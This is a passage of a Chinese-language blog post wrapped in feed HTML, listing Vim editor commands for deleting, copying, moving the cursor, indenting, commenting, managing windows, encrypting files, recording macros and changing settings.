删除当前字符至行尾。D&#x3D;d$</span><br><span class="line">d$  删除当前字符至行尾</span><br><span class="line">d^  删除当前字符之前至行首</span><br></pre></td></tr></table></figure><p>以单词为单位删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopydw  删除当前字符到单词尾</span><br><span class="line">daw 删除当前字符所在单词</span><br></pre></td></tr></table></figure><p>以行为单位删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CopyCopydd  删除当前行</span><br><span class="line">dj  删除下一行</span><br><span class="line">dk  删除上一行</span><br><span class="line"></span><br><span class="line">dgg  删除当前行至文档首部</span><br><span class="line">d1G  删除当前行至文档首部</span><br><span class="line">dG   删除当前行至文档尾部</span><br><span class="line"></span><br><span class="line">kdgg  删除当前行之前所有行（不包括当前行）</span><br><span class="line">jdG   删除当前行之后所有行（不包括当前行）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10d     删除当前行开始的10行。</span><br><span class="line">:1,10d  删除1-10行</span><br><span class="line">:11,$d  删除11行及以后所有的行</span><br><span class="line">:1,$d   删除所有行</span><br><span class="line">J　　   删除两行之间的空行，实际上是合并两行。</span><br></pre></td></tr></table></figure><h2 id="8-复制粘贴"><a href="#8-复制粘贴" class="headerlink" title="8. 复制粘贴#"></a>8. 复制粘贴<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_7" target="_blank" rel="noopener">#</a></h2><p>普通模式中使用y复制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyyy   复制游标所在的整行（3yy表示复制3行）</span><br><span class="line"></span><br><span class="line">y^   复制至行首，或y0。不含光标所在处字符。</span><br><span class="line">y$   复制至行尾。含光标所在处字符。</span><br><span class="line"></span><br><span class="line">yw   复制一个单词。</span><br><span class="line">y2w  复制两个单词。</span><br><span class="line"></span><br><span class="line">yG   复制至文本末。</span><br><span class="line">y1G  复制至文本开头。</span><br></pre></td></tr></table></figure><p>普通模式中使用p粘贴</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyp(小写)：代表粘贴至光标后（下边，右边）</span><br><span class="line">P(大写)：代表粘贴至光标前（上边，左边）</span><br></pre></td></tr></table></figure><h2 id="9-剪切粘贴"><a href="#9-剪切粘贴" class="headerlink" title="9. 剪切粘贴#"></a>9. 剪切粘贴<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_8" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CopyCopydd    其实就是剪切命令，剪切当前行</span><br><span class="line">ddp   剪切当前行并粘贴，可实现当前行和下一行调换位置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正常模式下按v（逐字）或V（逐行）进入可视模式</span><br><span class="line">然后用jklh命令移动即可选择某些行或字符，再按d即可剪切</span><br><span class="line"></span><br><span class="line">ndd 剪切当前行之后的n行。利用p命令可以对剪切的内容进行粘贴</span><br><span class="line"></span><br><span class="line">:1,10d 将1-10行剪切。利用p命令可将剪切后的内容进行粘贴。</span><br><span class="line"></span><br><span class="line">:1, 10 m 20 将第1-10行移动到第20行之后。</span><br></pre></td></tr></table></figure><h2 id="10-退出保存"><a href="#10-退出保存" class="headerlink" title="10. 退出保存#"></a>10. 退出保存<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_9" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:wq 保存并退出</span><br><span class="line"></span><br><span class="line">ZZ 保存并退出</span><br><span class="line"></span><br><span class="line">:q! 强制退出并忽略所有更改</span><br><span class="line"></span><br><span class="line">:e! 放弃所有修改，并打开原来文件。</span><br><span class="line"></span><br><span class="line">ZZ 保存并退出</span><br><span class="line"></span><br><span class="line">:sav(eas) new.txt  另存为一个新文件，退出原文件的编辑且不会保存</span><br><span class="line">:f(ile) new.txt    新开一个文件，并不保存，退出原文件的编辑且不会保存</span><br></pre></td></tr></table></figure><h2 id="11-移动命令"><a href="#11-移动命令" class="headerlink" title="11. 移动命令#"></a>11. 移动命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_10" target="_blank" rel="noopener">#</a></h2><p>以字符为单位移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyh   左移一个字符</span><br><span class="line">l   右移一个字符</span><br><span class="line">k   上移一个字符</span><br><span class="line">j   下移一个字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 【定位字符】f和F</span><br><span class="line">fx    找到光标后第一个为x的字符</span><br><span class="line">3fd   找到光标后第三个为d的字符</span><br><span class="line"></span><br><span class="line">F   同f，反向查找。</span><br></pre></td></tr></table></figure><p>以行为单位移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 10指代所有数字，可任意指定</span><br><span class="line">10h  左移10个字符</span><br><span class="line">10l  右移10个字符</span><br><span class="line">10k  上移10行</span><br><span class="line">10j  下移10行</span><br><span class="line"></span><br><span class="line">$   移动到行尾 </span><br><span class="line">3$  移动到下面3行的行尾</span><br></pre></td></tr></table></figure><p>以单词为单位移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyw  向前移动一个单词（光标停在单词首部）</span><br><span class="line">b  向后移动一个单词</span><br><span class="line">e，同w，只不过是光标停在单词尾部</span><br><span class="line">ge 同b，光标停在单词尾部。</span><br></pre></td></tr></table></figure><p>以句为单位移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy(   移动到句首</span><br><span class="line">)   移动到句尾</span><br></pre></td></tr></table></figure><p>跳转到文件的首尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopygg  移动到文件头。 &#x3D; [[  &#x3D;&#x3D; &#96;&#96;</span><br><span class="line">G   移动到文件尾。 &#x3D; ]]</span><br></pre></td></tr></table></figure><p>其他移动方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy^   移动到本行第一个非空白字符上。</span><br><span class="line">0   移动到本行第一个字符上(可以是空格)</span><br></pre></td></tr></table></figure><p>使用 <code>具名标记</code> 跳转，个人感觉这个很好用，因为可以跨文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy使用 ma ，可以将此处标记为 a，使用 &#39;a 进行跳转</span><br><span class="line">使用 :marks 可以查看所有的标记</span><br><span class="line">使用 :delm！可以删除所有的标记</span><br></pre></td></tr></table></figure><p>当在查看错误日志时，正常的步骤是，vim打开文件，然后使用 <code>shift+g</code> 再跳转到最后一行，这里有个更简单的操作可以在打开文件时立即跳到最后一行。只要在 vim 和 文件 中间加个 <code>+</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy</span><br><span class="line">Copyvim + you.log</span><br></pre></td></tr></table></figure><p>举一反三，当你想打开文件立即跳转到指定行时，可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 打开文件并跳转到 20 行</span><br><span class="line">vim you.log +20</span><br></pre></td></tr></table></figure><p>当你使用 <code>/</code> 搜索定位跳转或者使用 <code>:行号</code> 进行精准跳转时，有时我们想返回到上一次的位置，如何实现？</p><p>只要使用 Ctrl+o 即可返回上一次的位置。</p><h2 id="12-排版功能"><a href="#12-排版功能" class="headerlink" title="12. 排版功能#"></a>12. 排版功能<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_11" target="_blank" rel="noopener">#</a></h2><p><strong>缩进</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:set shiftwidth?   查看缩进值</span><br><span class="line">:set shiftwidth&#x3D;4  设置缩进值为4</span><br><span class="line"></span><br><span class="line"># 缩进相关 最好写到配置文件中  ~&#x2F;.vimrc</span><br><span class="line">:set tabstop&#x3D;4</span><br><span class="line">:set softtabstop&#x3D;4</span><br><span class="line">:set shiftwidth&#x3D;4</span><br><span class="line">:set expandtab</span><br><span class="line"></span><br><span class="line">&gt;&gt;   向右缩进</span><br><span class="line">&lt;&lt;   取消缩进</span><br></pre></td></tr></table></figure><p>如何你要对代码进行缩进，还可以用 <code>==</code> 对当前行缩进，如果要对多行对待缩进，则使用 n<code>==</code>，这种方式要求你所编辑的文件的扩展名是被vim所识别的，比如<code>.py</code>文件。</p><p><strong>排版</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:ce   居中</span><br><span class="line">:le   靠左</span><br><span class="line">:ri   靠右</span><br></pre></td></tr></table></figure><h2 id="13-注释命令"><a href="#13-注释命令" class="headerlink" title="13. 注释命令#"></a>13. 注释命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_12" target="_blank" rel="noopener">#</a></h2><p><strong>多行注释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy进入命令行模式，按ctrl + v进入 visual block模式，然后按j, 或者k选中多行，把需要注释的行标记起来</span><br><span class="line"></span><br><span class="line">按大写字母I，再插入注释符，例如&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">按esc键就会全部注释了</span><br></pre></td></tr></table></figure><p><strong>取消多行注释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy进入命令行模式，按ctrl + v进入 visual block模式，按字母l横向选中列的个数，例如 &#x2F;&#x2F; 需要选中2列</span><br><span class="line"></span><br><span class="line">按字母j，或者k选中注释符号</span><br><span class="line"></span><br><span class="line">按d键就可全部取消注释</span><br></pre></td></tr></table></figure><p><strong>复杂注释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:3,5 s&#x2F;^&#x2F;#&#x2F;g 注释第3-5行</span><br><span class="line">:3,5 s&#x2F;^#&#x2F;&#x2F;g 解除3-5行的注释</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:1,$ s&#x2F;^&#x2F;#&#x2F;g 注释整个文档</span><br><span class="line">:1,$ s&#x2F;^#&#x2F;&#x2F;g 取消注释整个文档</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:%s&#x2F;^&#x2F;#&#x2F;g 注释整个文档，此法更快</span><br><span class="line">:%s&#x2F;^#&#x2F;&#x2F;g 取消注释整个文档</span><br></pre></td></tr></table></figure><h2 id="14-调整视野"><a href="#14-调整视野" class="headerlink" title="14. 调整视野#"></a>14. 调整视野<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_13" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy&quot;zz&quot;：命令会把当前行置为屏幕正中央，</span><br><span class="line">&quot;zt&quot;：命令会把当前行置于屏幕顶端</span><br><span class="line">&quot;zb&quot;：则把当前行置于屏幕底端.</span><br><span class="line"></span><br><span class="line">Ctrl + e 向下滚动一行</span><br><span class="line">Ctrl + y 向上滚动一行</span><br><span class="line"></span><br><span class="line">Ctrl + d 向下滚动半屏</span><br><span class="line">Ctrl + u 向上滚动半屏</span><br><span class="line"></span><br><span class="line">Ctrl + f 向下滚动一屏</span><br><span class="line">Ctrl + b 向上滚动一屏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【跳到指定行】：两种方法</span><br><span class="line"></span><br><span class="line">可以先把行号打开</span><br><span class="line">:set nu  打开行号</span><br><span class="line"></span><br><span class="line">:20    跳到第20行</span><br><span class="line">20G    跳到第20行</span><br></pre></td></tr></table></figure><h2 id="15-区域选择"><a href="#15-区域选择" class="headerlink" title="15. 区域选择#"></a>15. 区域选择<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_14" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy要进行区域选择，要先进入可视模式</span><br><span class="line"></span><br><span class="line">v   以字符为单位，上下左右选择</span><br><span class="line">V   以行为单位，上下选择</span><br><span class="line"></span><br><span class="line">选择后可进行操作</span><br><span class="line">d   剪切&#x2F;删除</span><br><span class="line">y   复制</span><br><span class="line"></span><br><span class="line">Ctrl+v   如果当前是V(大写)模式，就变成v(小写)</span><br><span class="line">         如果当前是v(小写)模式，就变成普通模式。</span><br><span class="line">         如果当前是普通模式，就进入v(小写)模式</span><br><span class="line"></span><br><span class="line">利用这个，可以进行多行缩进。</span><br><span class="line"></span><br><span class="line">ggVG   选择全文</span><br></pre></td></tr></table></figure><h2 id="16-窗口控制"><a href="#16-窗口控制" class="headerlink" title="16. 窗口控制#"></a>16. 窗口控制<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_15" target="_blank" rel="noopener">#</a></h2><p><strong>新建窗口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 打开两个文件分属两个窗口</span><br><span class="line">vim -o 1.txt 2.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 假设现在已经打开了1.txt</span><br><span class="line"></span><br><span class="line">:sp 2.txt   开启一个横向的窗口，编辑2.txt</span><br><span class="line">:vsp 2.txt  开启一个竖向的窗口，编辑2.txt</span><br><span class="line"></span><br><span class="line">:split        将当前窗口再复制一个窗口出来，内容同步，游标可以不同</span><br><span class="line">:split 2.txt  在新窗口打开2.txt的横向窗口</span><br><span class="line"></span><br><span class="line"># 需要注意：内容同步，但是游标位置是独立的</span><br><span class="line"></span><br><span class="line">Ctrl-w s    将当前窗口分成水平窗口</span><br><span class="line">Ctrl-w v    将当前窗口分成竖直窗口</span><br><span class="line"></span><br><span class="line">Ctrl-w q    等同:q 结束分割出来的视窗。</span><br><span class="line">Ctrl-w q!   等同:q! 结束分割出来的视窗。</span><br><span class="line">Ctrl-w o    打开一个视窗并且隐藏之前的所有视窗</span><br></pre></td></tr></table></figure><p><strong>窗口切换</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 特别说明：Ctrl w &lt;字母&gt; 不需要同时按</span><br><span class="line"></span><br><span class="line">Ctrl-w h    切换到左边窗口</span><br><span class="line">Ctrl-w l    切换到右边窗口</span><br><span class="line"></span><br><span class="line">Ctrl-w j    切换到下边窗口</span><br><span class="line">Ctrl-w k    切换到上边窗口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 特别说明：全屏模式下</span><br><span class="line">:n    切换下一个窗口</span><br><span class="line">:N    切换上一个窗口</span><br><span class="line">:bp   切换上一个窗口</span><br><span class="line"></span><br><span class="line"># 特别说明：非全屏模式</span><br><span class="line"></span><br><span class="line">:bn    切换下一个窗口，就当前位置的窗口的内容变了，其他窗口不变</span><br><span class="line">:bN    切换上一个窗口，就当前位置的窗口的内容变了，其他窗口不变</span><br></pre></td></tr></table></figure><p><strong>窗口移动</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 特别说明：Ctrl w &lt;字母&gt; 不需要同时按</span><br><span class="line"></span><br><span class="line">Ctrl-w J   将当前视窗移至最下面</span><br><span class="line">Ctrl-w K   将当前视窗移最上面</span><br><span class="line"></span><br><span class="line">Ctrl-w H   将当前视窗移至最左边</span><br><span class="line">Ctrl-w L   将当前视窗移至最右边</span><br><span class="line"></span><br><span class="line">Ctrl-ww    按顺序切换窗口</span><br></pre></td></tr></table></figure><p><strong>调整尺寸</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 友情提示：键盘切记不要处于中文状态</span><br><span class="line"></span><br><span class="line">Ctrl-w +   增加窗口高度</span><br><span class="line">Ctrl-w -   减少窗口高度</span><br></pre></td></tr></table></figure><p><strong>退出窗口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:close    关闭当前窗口</span><br><span class="line">:close!   强制关闭当前窗口</span><br><span class="line"></span><br><span class="line">:q       退出，不保存</span><br><span class="line">:q!      强制退出，不保存</span><br><span class="line"></span><br><span class="line">:x       保存退出</span><br><span class="line">:wq      保存退出</span><br><span class="line">:wq!     强制保存退出</span><br><span class="line"></span><br><span class="line">:w &lt;[路径&#x2F;]文件名&gt;        另存为</span><br><span class="line">:savesa &lt;[路径&#x2F;]文件名&gt;   另存为</span><br><span class="line"></span><br><span class="line">ZZ 保存并退出。</span><br><span class="line"></span><br><span class="line">:only    关闭所有窗口，只保留当前窗口(前提：其他窗口内容有改变的话都要先保存)</span><br><span class="line">:only!   关闭所有窗口，只保留当前窗口</span><br><span class="line"></span><br><span class="line">:qall 放弃所有操作并退出</span><br><span class="line">:wall 保存所有，</span><br><span class="line">:wqall 保存所有并退出。</span><br></pre></td></tr></table></figure><h2 id="17-文档加密"><a href="#17-文档加密" class="headerlink" title="17. 文档加密#"></a>17. 文档加密<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_16" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyvim -x file_name</span><br><span class="line"></span><br><span class="line">然后输入密码：</span><br><span class="line">确认密码：</span><br><span class="line"></span><br><span class="line">如果不修改内容也要保存。:wq，不然密码设定不会生效。</span><br></pre></td></tr></table></figure><h2 id="18-录制宏"><a href="#18-录制宏" class="headerlink" title="18. 录制宏#"></a>18. 录制宏<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_17" target="_blank" rel="noopener">#</a></h2><p>按q键加任意字母开始录制，再按q键结束录制（这意味着vim中的宏不可嵌套），使用的时候@加宏名，比如qa。。。q录制名为a的宏，@a使用这个宏。</p><h2 id="19-执行命令"><a href="#19-执行命令" class="headerlink" title="19. 执行命令#"></a>19. 执行命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_18" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 重复前一次命令</span><br><span class="line">. </span><br><span class="line"></span><br><span class="line"># 执行shell命令</span><br><span class="line">:!command</span><br><span class="line"></span><br><span class="line"># 比如列出当前目录下文件</span><br><span class="line">:!ls </span><br><span class="line"></span><br><span class="line"># 执行脚本</span><br><span class="line">:!perl -c script.pl 检查perl脚本语法，可以不用退出vim，非常方便。</span><br><span class="line">:!perl script.pl 执行perl脚本，可以不用退出vim，非常方便。</span><br><span class="line"></span><br><span class="line">:suspend或Ctrl - Z 挂起vim，回到shell，按fg可以返回vim。</span><br></pre></td></tr></table></figure><h2 id="20-帮助命令"><a href="#20-帮助命令" class="headerlink" title="20. 帮助命令#"></a>20. 帮助命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_19" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy在Unix&#x2F;Linux系统上</span><br><span class="line">$ vimtutor</span><br><span class="line"></span><br><span class="line"># 普通模式下</span><br><span class="line">键盘输入vim或F1</span><br><span class="line"></span><br><span class="line"># 命令行模式下</span><br><span class="line"></span><br><span class="line">:help     显示整个帮助</span><br><span class="line">:help xxx 显示xxx的帮助，比如 :help i, :help CTRL-[（即Ctrl+[的帮助）。</span><br><span class="line">:help &#39;number&#39; Vim选项的帮助用单引号括起</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在Windows系统上</span><br><span class="line">:help tutor</span><br></pre></td></tr></table></figure><h2 id="21-配置命令"><a href="#21-配置命令" class="headerlink" title="21. 配置命令#"></a>21. 配置命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_20" target="_blank" rel="noopener">#</a></h2><p>显示当前设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:set或者:se显示所有修改过的配置</span><br><span class="line">:set all 显示所有的设定值</span><br><span class="line">:set option? 显示option的设定值</span><br><span class="line">:set nooption 取消当期设定值</span><br><span class="line">:ver   显示vim的所有信息（包括版本和参数等）</span><br><span class="line"></span><br><span class="line"># 需要注意：全屏模式下</span><br><span class="line">:args   查看当前打开的文件列表，当前正在编辑的文件会用[]括起来</span><br></pre></td></tr></table></figure><p>更改设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy:set nu   显示行号</span><br><span class="line"></span><br><span class="line">set autoindent(ai)   设置自动缩进</span><br><span class="line">set autowrite(aw)    设置自动存档，默认未打开</span><br><span class="line">set backup(bk) 设置自动备份，默认未打开</span><br><span class="line"></span><br><span class="line">set background&#x3D;dark或light，设置背景风格</span><br><span class="line"></span><br><span class="line">set cindent(cin) 设置C语言风格缩进</span><br><span class="line"></span><br><span class="line">:set ts&#x3D;4   设置tab键转换为4个空格</span><br><span class="line"></span><br><span class="line">:set ff&#x3D;unix   # 修改文件dos文件为unix</span><br><span class="line"></span><br><span class="line">:set shiftwidth?   查看缩进值</span><br><span class="line">:set shiftwidth&#x3D;4  设置缩进值为4</span><br><span class="line"></span><br><span class="line">:set ignorecase　　忽略大小写的查找</span><br><span class="line">:set noignorecase　　不忽略大小写的查找</span><br><span class="line"></span><br><span class="line">:set paste  # insert模式下，粘贴格式不会乱掉</span><br><span class="line"></span><br><span class="line">:set ruler?　　查看是否设置了ruler，在.vimrc中，使用set命令设制的选项都可以通过这个命令查看</span><br><span class="line"></span><br><span class="line">:scriptnames　　查看vim脚本文件的位置，比如.vimrc文件，语法文件及plugin等。</span><br><span class="line"></span><br><span class="line">:set list 显示非打印字符，如tab，空格，行尾等。如果tab无法显示，请确定用set lcs&#x3D;tab:&gt;-命令设置了.vimrc文件，并确保你的文件中的确有tab，如果开启了expendtab，那么tab将被扩展为空格。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:syntax        列出已经定义的语法项</span><br><span class="line">:syntax clear  清除已定义的语法规则</span><br><span class="line"></span><br><span class="line">:syntax case match    大小写敏感，int和Int将视为不同的语法元素</span><br><span class="line">:syntax case ignore   大小写无关，int和Int将视为相同的语法元素，并使用同样的配色方案</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
